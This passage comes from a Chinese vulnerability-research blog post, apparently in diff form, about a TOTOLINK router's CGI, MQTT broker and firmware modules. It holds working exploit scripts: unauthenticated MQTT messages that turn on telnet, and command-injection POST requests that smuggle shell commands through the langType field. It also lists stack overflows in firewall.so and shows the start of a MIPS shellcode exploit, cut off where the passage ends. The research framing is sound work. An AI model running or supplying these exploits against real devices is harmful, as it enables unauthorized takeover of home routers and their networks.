v3指向readdir()函数返回结构体中的d_name，也就是目录下的文件名</span></span><br><span class="line">      ...</span><br><span class="line">        <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xF000</span>) != <span class="number">0x4000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sprintf</span>(v9, v13, &amp;dword_4037B0, v3);      <span class="comment">//通过sprintf将目录+文件名输出给v9</span></span><br><span class="line">          flib = dlopen(v9, <span class="number">1</span>);                     <span class="comment">//dlopen打开&quot;/lib/cste_modules/xxx.so&quot;</span></span><br><span class="line">          error_message = dlerror();</span><br><span class="line">          ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>因此，调用system.so的程序为bin/目录下的cste_sub，这个cste_sub是做什么的呢？我们利用路由器shell一探究竟。</p>
+<p><strong>5、cste_sub是什么</strong></p>
+<p>这里我利用<code>python -m SimpleHTTPServer</code>及<code>wget</code>上传了一个完整版的<code>busybox-mipsel</code>到路由器上，通过netstat查看端口连接情况：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./busybox-mipsel netstat -pantu</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1363/lighttpd</span><br><span class="line">tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      1279/dnsmasq</span><br><span class="line">tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1343/telnetd</span><br><span class="line">tcp        0      0 0.0.0.0:1883            0.0.0.0:*               LISTEN      1324/cs_broker</span><br><span class="line">tcp        0    162 192.168.55.1:23         192.168.55.2:49510      ESTABLISHED 1343/telnetd</span><br><span class="line">tcp        0      0 127.0.0.1:48295         127.0.0.1:1883          TIME_WAIT   -</span><br><span class="line">tcp        0      0 127.0.0.1:47306         127.0.0.1:1883          ESTABLISHED 9913/cste_sub</span><br><span class="line">tcp        0      0 127.0.0.1:1883          127.0.0.1:47306         ESTABLISHED 1324/cs_broker</span><br><span class="line">netstat: /proc/net/tcp6: No such file or directory</span><br><span class="line">udp        0      0 0.0.0.0:53              0.0.0.0:*                           1279/dnsmasq</span><br><span class="line">udp        0      0 0.0.0.0:67              0.0.0.0:*                           1028/udhcpd</span><br><span class="line">netstat: /proc/net/udp6: No such file or directory</span><br></pre></td></tr></table></div></figure>
+<p>可以看到cste_sub作为客户端，跟1883端口建立了连接，1883端口对应的程序名是cs_broker。而1883端口对应mqtt服务，因此cs_broker就是mqtt服务。</p>
+<p><strong>6、再次整理思路</strong></p>
+<p>现在已知的几个模块有：</p>
+<ul>
+<li><code>cstecgi.cgi</code>：是lighttpd起的子进程，处理来自客户端发送的设置telnet的http包</li>
+<li><code>cste_sub</code>：该进程中加载了system.so，并实际执行了设置telnet开关的操作</li>
+<li><code>cs_broker</code>：mqtt服务，跟cste_sub之间有交互</li>
+</ul>
+<p>所以从cstecgi.cgi中有两条路可能触发到system.so：</p>
+<p>1）<code>cstecgi.cgi</code> –》 <code>cste_sub</code></p>
+<p>2）<code>cstecgi.cgi</code>   –》 <code>cs_broker</code> –》 <code>cste_sub</code></p>
+<p>为了弄清楚在<code>cstecgi.cgi</code>中究竟是怎样调用的，我们再次回到IDA中分析：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v30, <span class="string">&quot;postapIpAddr&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = cJSON_GetObjectItem(v18, <span class="string">&quot;postapIpAddr&quot;</span>);</span><br><span class="line">    set_CSTEInfo(*(_DWORD *)(v5 + <span class="number">16</span>), <span class="number">1883</span>, <span class="number">60</span>);       <span class="comment">//看到了1883端口</span></span><br><span class="line">    v6 = cJSON_GetObjectItem(v18, <span class="string">&quot;aptopicurl&quot;</span>);</span><br><span class="line">    web_getData(<span class="number">0</span>, *(_DWORD *)(v6 + <span class="number">16</span>), v30, (<span class="keyword">int</span>)v35);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    set_CSTEInfo(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1883</span>, <span class="number">60</span>);            <span class="comment">//看到了1883端口</span></span><br><span class="line">    web_getData(<span class="number">0</span>, v23, v30, (<span class="keyword">int</span>)v35);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>发现了对1883端口的调用，以及两个函数<code>set_CSTEInfo()</code>和<code>web_getData()</code>。因此符合上述2）的情况，可以大致推测出，<code>cstecgi.cgi</code>通过这两个函数实现跟<code>cste_broker</code>进行通信，而后<code>cste_broker</code>将数据传递给<code>cste_sub</code>进行处理。</p>
+<p><strong>7、libmosquitto</strong></p>
+<p>经全局搜索，<code>set_CSTEInfo()</code>与<code>web_getData()</code>的函数实现在<code>lib/libmosquitto.so</code>中。libmosquitto原本是一个开源的组件，这里TOTOLINK厂商对其进行二次开发做了些更改。可以知道的是，这两个函数实现了之间的通信。<code>cstecgu.cgi</code>到底发送了什么，我们通过网络抓包分析是更为直接和准确的办法！</p>
+<p>这一部分内容，参考MQTT相关章节。</p>
+
+        <h1 id="MQTT服务"   >
+          <a href="#MQTT服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#MQTT服务" class="headerlink" title="MQTT服务"></a>MQTT服务</h1>
+      <p>关于什么是MQTT，老徐的文章里写的很清楚：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gtrboy.github.io/posts/bus/#0x01-mqtt%E5%8D%8F%E8%AE%AE" >物联网设备消息总线机制的使用及安全问题</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>这里记录一下我在TOTOLINK上抓包分析MQTT报文的过程。</p>
+
+        <h2 id="mqtt报文分析"   >
+          <a href="#mqtt报文分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#mqtt报文分析" class="headerlink" title="mqtt报文分析"></a>mqtt报文分析</h2>
+      <p>由于路由器上没有tcpdump，所以考虑编译一个静态链接的tcpdump，用于抓路由器上的通信报文。</p>
+
+        <h3 id="本地编译tcpdump"   >
+          <a href="#本地编译tcpdump" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地编译tcpdump" class="headerlink" title="本地编译tcpdump"></a>本地编译tcpdump</h3>
+      <p>因为第一次编tcpdump，所以先在本地编一个x86架构的版本试试。</p>
+<ol>
+<li><p>官网下载tcpdump和libpcap</p>
+</li>
+<li><p>编译libpcap</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></div></figure></li>
+<li><p>编译tcpdump</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make --without-crypto CFLAGS=-static</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="交叉编译mipsel版tcpdump"   >
+          <a href="#交叉编译mipsel版tcpdump" class="heading-link"><i class="fas fa-link"></i></a><a href="#交叉编译mipsel版tcpdump" class="headerlink" title="交叉编译mipsel版tcpdump"></a>交叉编译mipsel版tcpdump</h3>
+      </li>
+<li><p>下载tcpdump和libpacap源码</p>
+</li>
+<li><p>ubuntu中安装mipsel gcc</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-mipsel-linux-gnu</span><br></pre></td></tr></table></div></figure></li>
+<li><p>编译libpcap</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/home/bling/mipsel_libpcap     #该目录可根据情况更改</span><br><span class="line">make CC=mipsel-linux-gnu-gcc</span><br><span class="line">make install CC=mipsel-linux-gnu-gcc       #编译的libpcap安装到了/home/bling/mipsel_libpcap目录下</span><br></pre></td></tr></table></div></figure></li>
+<li><p>编译tcpdump</p>
+<ul>
+<li>动态链接</li>
+</ul>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd tcpdump-4.99.1/</span><br><span class="line">./configure</span><br><span class="line">make CC=mipsel-linux-gnu-gcc CFLAGS=&#x27;-I/home/bling/mipsel_libpcap/include&#x27; LDFLAGS=&#x27;-L/home/bling/mipsel_libpcap/lib/libpcap.a&#x27;</span><br></pre></td></tr></table></div></figure>
+<ul>
+<li>静态链接</li>
+</ul>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd tcpdump-4.99.1/</span><br><span class="line">./configure</span><br><span class="line">make CC=mipsel-linux-gnu-gcc CFLAGS=&#x27;-I/home/bling/mipsel_libpcap/include -static&#x27; LDFLAGS=&#x27;-L/home/bling/mipsel_libpcap/lib/libpcap.a -static&#x27;</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="使用tcpdump抓报文"   >
+          <a href="#使用tcpdump抓报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用tcpdump抓报文" class="headerlink" title="使用tcpdump抓报文"></a><strong>使用tcpdump抓报文</strong></h3>
+      </li>
+</ol>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tcpdump -i lo -w ./test.pcap</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="封闭服务器数据回传"   >
+          <a href="#封闭服务器数据回传" class="heading-link"><i class="fas fa-link"></i></a><a href="#封闭服务器数据回传" class="headerlink" title="封闭服务器数据回传"></a><strong>封闭服务器数据回传</strong></h3>
+      <p>路由器相当于一个封闭服务器，为了将路由器中tcpdump的包传给我们本地分析，有以下几种方法：</p>
+<ul>
+<li>wget post</li>
+<li>tftpd</li>
+<li>metepreter植入后门下载（最方便）</li>
+<li>base64编码</li>
+</ul>
+<ol>
+<li><p>meterpreter植入后门下载（尝试失败）</p>
+</li>
+<li><p>base64编码</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/test.pcap  | /tmp/busybox-mipsel base64        # 编码过程</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将base64编码的内容保存到本地文件pcap64</span></span><br><span class="line">cat pcap64 | base64 -d &gt; test.pcap          # 解码过程</span><br></pre></td></tr></table></div></figure>
+<p>另两种方法暂未尝试。</p>
+</li>
+</ol>
+
+        <h3 id="pcap报文分析"   >
+          <a href="#pcap报文分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#pcap报文分析" class="headerlink" title="pcap报文分析"></a><strong>pcap报文分析</strong></h3>
+      <p>wireshark中打开刚刚使用tcpdump捕获的pcap报文，就可以分析mqtt相关的条目了。这里附上得到的pcap文件：<a href="test.pcap">test.pcap</a></p>
+<p>其实wireshark已经根据mqtt协议都帮我们分析好了，我们可以跟踪各tcp流看看收发情况，理解一下cs_broker和cste_sub之间，以及cs_broker和cstecgi.cgi之间的数据交互过程。</p>
+<p>mqtt协议可参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mcxiaoke.gitbooks.io/mqtt-cn/content/" >MQTT协议中文版</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="构造mqtt报文"   >
+          <a href="#构造mqtt报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#构造mqtt报文" class="headerlink" title="构造mqtt报文"></a>构造mqtt报文</h2>
+      
+        <h3 id="mqtt-fx的subscribe与publish"   >
+          <a href="#mqtt-fx的subscribe与publish" class="heading-link"><i class="fas fa-link"></i></a><a href="#mqtt-fx的subscribe与publish" class="headerlink" title="mqtt.fx的subscribe与publish"></a><strong>mqtt.fx的subscribe与publish</strong></h3>
+      <p>下载链接：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mqttfx.jensd.de/index.php/download" >mqtt.fx下载</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>通过subscribe # 可以监听所有的topic。</p>
+<p>用mqtt.fx抓一个“打开telnet开关”的包，然后通过publish界面重放。如下图所示：</p>
+<p><img src="image-20210815211654119.png" alt="image-20210815211654119.png"></p>
+<p>这一操作过程，在本地用wireshark抓了一个包，<a href="set_telnet_1.pcapng">set_telnet_1.pcapng</a>。</p>
+<p>分析过程如下，根据此分析，可以使用pwntools构造mqtt报文来实现路由器telnet的开关。</p>
+<p><img src="image-20210815212828443.png" alt="image-20210815212828443.png"></p>
+
+        <h3 id="利用pwntools构造"   >
+          <a href="#利用pwntools构造" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用pwntools构造" class="headerlink" title="利用pwntools构造"></a>利用pwntools构造</h3>
+      <p>根据上文中wireshark的分析，利用pwntools我们只需构造一次connect+一次setTelnetCfg就行（remote()函数本身就是建立TCP连接，因此这个层面的东西我们无需考虑）。非常简单，脚本如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.55.1&quot;</span>,<span class="number">1883</span>)</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">&quot;\x10\x1a\x00\x04\x4d\x51\x54\x54\x04\x02\x00\x3c\x00\x0e\x4d\x51\x54\x54\x5f\x46\x58\x5f\x43\x6c\x69\x65\x6e\x74&quot;</span></span><br><span class="line">msg2 = <span class="string">&quot;\x30\x65\x00\x24\x74\x6f\x74\x6f\x6c\x69\x6e\x6b\x2f\x72\x6f\x75\x74\x65\x72\x2f\x73\x65\x74\x74\x69\x6e\x67\x2f\x73\x65\x74\x54\x65\x6c\x6e\x65\x74\x43\x66\x67\x7b\x0a\x09\x22\x74\x6f\x70\x69\x63\x75\x72\x6c\x22\x3a\x09\x22\x73\x65\x74\x74\x69\x6e\x67\x2f\x73\x65\x74\x54\x65\x6c\x6e\x65\x74\x43\x66\x67\x22\x2c\x0a\x09\x22\x74\x65\x6c\x6e\x65\x74\x5f\x65\x6e\x61\x62\x6c\x65\x64\x22\x3a\x09\x22\x31\x22\x0a\x7d&quot;</span></span><br><span class="line"></span><br><span class="line">io.send(msg1)       <span class="comment"># connect</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.send(msg2)       <span class="comment"># setTelnetCfg 1</span></span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="python-MQTT库构造"   >
+          <a href="#python-MQTT库构造" class="heading-link"><i class="fas fa-link"></i></a><a href="#python-MQTT库构造" class="headerlink" title="python MQTT库构造"></a>python MQTT库构造</h3>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.emqx.com/zh/blog/comparision-of-python-mqtt-client" >Python MQTT 客户端对比</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.emqx.com/zh/blog/how-to-use-mqtt-in-python" >如何在 Python 中使用 MQTT</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paho.mqtt.client <span class="keyword">as</span> mqtt</span><br><span class="line"></span><br><span class="line">client = mqtt.Client()</span><br><span class="line">client.connect(<span class="string">&quot;192.168.55.1&quot;</span>,<span class="number">1883</span>,<span class="number">60</span>)</span><br><span class="line">client.publish(<span class="string">&#x27;totolink/router/setting/setTelnetCfg&#x27;</span>,payload=<span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="再挖挖吧"   >
+          <a href="#再挖挖吧" class="heading-link"><i class="fas fa-link"></i></a><a href="#再挖挖吧" class="headerlink" title="再挖挖吧"></a>再挖挖吧</h1>
+      
+        <h2 id="挖一个cs-sub中so库的命令注入"   >
+          <a href="#挖一个cs-sub中so库的命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#挖一个cs-sub中so库的命令注入" class="headerlink" title="挖一个cs_sub中so库的命令注入"></a>挖一个cs_sub中so库的命令注入</h2>
+      <p>在lib/cste_modules/global.so中找到如下命令注入漏洞：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">setLanguageCfg</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">260</span>]; <span class="comment">// [sp+18h] [-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a2, <span class="string">&quot;langType&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  apmib_set(<span class="number">6002</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    apmib_update_web(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  CsteSystem(<span class="string">&quot;rm -rf /var/js/language* 1&gt;/dev/null 2&gt;&amp;1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(v8, <span class="string">&quot;cp /web_cste/js/language_%s.js /var/js/language.js&quot;</span>, v6);</span><br><span class="line">  CsteSystem(v8, <span class="number">0</span>);        <span class="comment">//命令注入</span></span><br><span class="line">  CsteSystem(<span class="string">&quot;ln -s /var/js/language.js /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  websSetCfgResponse(a1, a3, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>有两种方式触发该漏洞：</p>
+<ul>
+<li><p>通过80口的http服务</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setLanguageCfg&quot;,&quot;langType&quot;:&quot;;echo 123 &gt; /tmp/xy.txt;&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></div></figure></li>
+<li><p>通过1883口的mqtt服务</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paho.mqtt.client <span class="keyword">as</span> mqtt</span><br><span class="line"></span><br><span class="line">client = mqtt.Client()</span><br><span class="line">client.connect(<span class="string">&quot;192.168.55.1&quot;</span>,<span class="number">1883</span>,<span class="number">60</span>)</span><br><span class="line">client.publish(<span class="string">&#x27;totolink/router/setting/setLanguageCfg&#x27;</span>,payload=<span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setLanguageCfg&quot;,&quot;langType&quot;:&quot;;echo 123 &gt; /tmp/tmp.txt;&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+<p>以上两种方式，均可从如下三个方向进一步利用：</p>
+</li>
+</ul>
+<ol>
+<li><p>把ls等关键泄露信息，写入到通过80口可访问的文件中</p>
+<p>只需将命令执行的结果重定向到<code>/web_cste</code>目录下的某个新建文件（如<code>ls &gt; /web_cste/ls.txt</code>），然后在浏览器中通过<code>https://192.168.55.1/ls.txt</code>就可以查看<code>ls</code>命令的执行结果了。</p>
+</li>
+<li><p>反弹shell</p>
+<p>未完成tag</p>
+</li>
+<li><p>开telnet</p>
+<p>具有命令注入能力之后，开启telnet就很简单了，只不过需要注意一下<code>&amp;</code>这个特殊字符。最后是通过<code>#</code>的注释功能打成功的。exp如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.post(<span class="string">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setLanguageCfg&quot;,&quot;langType&quot;:&quot;;telnetd &amp; #;&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+<p>另外，telnetd的使用方法这里还有点迷，使用<code>telnetd &amp;</code>可以在totolink路由器中将服务起起来，但是我自己的ubuntu虚拟机中却不行，暂时还没弄明白啥原因。记一个未完成tag。</p>
+</li>
+</ol>
+
+        <h2 id="挖一个cs-sub中so库的栈溢出"   >
+          <a href="#挖一个cs-sub中so库的栈溢出" class="heading-link"><i class="fas fa-link"></i></a><a href="#挖一个cs-sub中so库的栈溢出" class="headerlink" title="挖一个cs_sub中so库的栈溢出"></a>挖一个cs_sub中so库的栈溢出</h2>
+      <p>找到的栈溢出点记录：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">firewall.so - setIpPortFilterRules()函数 - 第72&#x2F;73行 - v11</span><br><span class="line">firewall.so - setMacFilterRules()函数 - 第87&#x2F;88行 - v10</span><br><span class="line">firewall.so - setUrlFilterRules()函数 - 第32&#x2F;33行 - v9</span><br><span class="line">firewall.so - setParentalRules()函数 - 第43&#x2F;44行 - v9</span><br><span class="line">firewall.so - setPortForwardRules()函数 - 第55行 - v13</span><br><span class="line">firewall.so - setIpQosRules()函数 - 第34行 - v12</span><br><span class="line">firewall.so - setMacQos()函数 - 第41&#x2F;46行 - v12</span><br><span class="line"></span><br><span class="line">global.so - setLanguageCfg()函数 - 第16行 - v6</span><br></pre></td></tr></table></div></figure>
+<p>我挑了其中的一个漏洞点进一步利用，如下。</p>
+
+        <h3 id="filewall-so库中setIpQosRules函数"   >
+          <a href="#filewall-so库中setIpQosRules函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#filewall-so库中setIpQosRules函数" class="headerlink" title="filewall.so库中setIpQosRules函数"></a>filewall.so库中setIpQosRules函数</h3>
+      <p>漏洞代码片段如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">setIpQosRules</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">23</span>]; <span class="comment">// [sp+18h] [-B8h] BYREF</span></span><br><span class="line">  ......</span><br><span class="line">  v12 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a2, <span class="string">&quot;comment&quot;</span>, &amp;byte_9268);</span><br><span class="line">	......</span><br><span class="line">  <span class="built_in">strcpy</span>(v14, v12);</span><br><span class="line">  apmib_set(<span class="number">131385</span>, v14);</span><br><span class="line">  apmib_set(<span class="number">65848</span>, v14);</span><br><span class="line">  apmib_update_web(<span class="number">4</span>);</span><br><span class="line">  system(<span class="string">&quot;sysconf firewall&quot;</span>);</span><br><span class="line">  websSetCfgResponse(a1, a3, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><code>strcpy(v14,v12)</code>拷贝时可能会导致v14溢出，该漏洞所在函数的功能简单，无漏洞利用限制条件，因此利用起来较为简单。</p>
+<p>（1）通过80口进行攻击</p>
+<p>通过80口发送利用脚本，并在mqtt.fx中订阅所有消息。但是加上shellcode的脚本总是无法到达mqtt服务节点，猜测是因为shellcode中有特殊字符，在途中被拦截了。所以考虑通过mqtt服务的1883口打。</p>
+<p>（2）通过1883口进行攻击</p>
+<p>从这个口发送是可以的。不过，还是遇到了以下两个坑：</p>
+<ul>
+<li><code>\x00</code>截断，4字节变成3字节（不能用p32构造），巧妙利用strcpy函数会在拷贝结束加<code>\x00</code></li>
+<li>shellcode如果布置在test所在区间，由于shellcode中引号的存在，json解析时会把我们的shellcode截断，从而无法覆盖到函数返回地址。为了绕过这个限制，我们在花括号<code>&#123;&#125;</code> 后植入shellcode（虽然这段shellcode不会被当做json的一部分，但是该进程接收了这些字符，那么这一段shellcode就必然在进程内存中，只要某个时段这一内存区间未被覆盖，我们就能ret2shellcode）。字符串”bling”是方便我们进行shellcode定位用的，在某次调试中，定位到shellcode(buf)的起始地址为0x4143b4，因此有如下利用脚本。</li>
+</ul>
+<p>exp如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> paho.mqtt.client <span class="keyword">as</span> mqtt</span><br><span class="line"></span><br><span class="line">buf = <span class="string">&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span 